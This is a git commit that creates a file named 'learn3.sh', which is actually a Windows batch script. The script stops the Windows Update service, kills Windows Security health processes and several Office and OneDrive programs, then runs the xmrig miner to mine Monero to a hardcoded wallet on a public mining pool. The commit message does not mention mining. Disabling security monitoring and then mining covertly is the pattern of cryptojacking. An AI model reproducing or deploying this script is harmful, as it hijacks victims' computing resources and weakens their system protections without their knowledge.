8168f619cfd4e230c4e06dec3084a9eed64e337e
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-01-11 08:22:28 -0300

    Create learn3.sh

---
+++ learn3.sh
@@ -0,0 +1,11 @@
+@echo off
+net stop WUAUSERV
+taskkill /IM xmrig.exe
+taskkill /IM OneDrive.exe
+taskkill /IM SecurityHealthSystray.exe
+taskkill /IM SecurityHealthService.exe
+taskkill /IM ONENOTEM.exe
+taskkill /IM Teams.exe
+cd /d "%~dp0"
+xmrig.exe --coin=XMR -o xmr.2miners.com:2222 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.LearnSourceLabs -p x -t 6
+pause 
